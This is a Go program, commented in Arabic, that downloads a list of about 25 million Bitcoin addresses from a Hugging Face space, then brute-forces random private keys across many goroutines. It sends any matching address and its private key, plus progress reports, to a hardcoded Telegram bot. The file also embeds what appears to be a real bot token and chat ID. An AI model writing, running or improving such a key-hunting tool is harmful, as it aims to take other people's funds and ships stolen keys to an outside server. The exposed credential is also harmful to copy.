package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/sha256"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcutil/base58"
	"golang.org/x/crypto/ripemd160"
	"github.com/bits-and-blooms/bloom/v3" // مكتبة الفلتر الذكي
)

var (
	totalChecked uint64
	startTime    = time.Now()
	token        = "5921618897:AAGu6bp5gFtatio22y-XdWUSwAd0Lk6b1HY"
	chatID       = "227172927"
	fileURL      = "https://huggingface.co/spaces/OSAMA714/4524/resolve/main/wallets.zip?download=true"
)

func hash160(data []byte) []byte {
	h256 := sha256.Sum256(data)
	hasher := ripemd160.New()
	hasher.Write(h256[:])
	return hasher.Sum(nil)
}

func encodeAddress(pubKey []byte) string {
	return base58.CheckEncode(hash160(pubKey), 0x00)
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	sendTelegram("⚙️ جاري تجهيز الفلتر الذكي (ذاكرة منخفضة)...")

	resp, _ := http.Get(fileURL)
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	zipReader, _ := zip.NewReader(bytes.NewReader(body), int64(len(body)))

	// إنشاء فلتر يتسع لـ 25 مليون عنوان مع نسبة خطأ ضئيلة جداً
	filter := bloom.NewWithEstimates(25000000, 0.0001)
	
	count := 0
	for _, f := range zipReader.File {
		rc, _ := f.Open()
		scanner := bufio.NewScanner(rc)
		for scanner.Scan() {
			addr := strings.TrimSpace(scanner.Text())
			if len(addr) > 25 {
				filter.Add([]byte(addr))
				count++
			}
		}
		rc.Close()
	}

	sendTelegram(fmt.Sprintf("✅ الفلتر جاهز! تم حماية %d عنوان.\n🚀 انطلق الصيد...", count))

	// تقرير كل دقيقتين عشان نراقب السرعة
	go func() {
		for {
			time.Sleep(2 * time.Minute)
			sendReport()
		}
	}()

	for i := 0; i < cores*40; i++ {
		go func() {
			for {
				priv, _ := btcec.NewPrivateKey()
				
				// فحص Compressed
				addrC := encodeAddress(priv.PubKey().SerializeCompressed())
				if filter.Test([]byte(addrC)) {
					sendFound(addrC, "Compressed", priv)
				}

				// فحص Uncompressed
				addrU := encodeAddress(priv.PubKey().SerializeUncompressed())
				if filter.Test([]byte(addrU)) {
					sendFound(addrU, "Uncompressed", priv)
				}

				atomic.AddUint64(&totalChecked, 1)
			}
		}()
	}
	select {}
}

func sendReport() {
	elapsed := time.Since(startTime).Seconds()
	total := atomic.LoadUint64(&totalChecked)
	speed := float64(total) / elapsed
	report := fmt.Sprintf("📊 *تقرير الأخطبوط*\nالسرعة: %.0f K/s\nالإجمالي: %d", speed, total)
	sendTelegram(report)
}

func sendTelegram(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", token, chatID, url.QueryEscape(text))
	http.Get(apiURL)
}

func sendFound(addr string, kind string, priv *btcec.PrivateKey) {
	msg := fmt.Sprintf("💰 JACKPOT!\nAddr: %s\nKey: %x", addr, priv.Serialize())
	sendTelegram(msg)
}
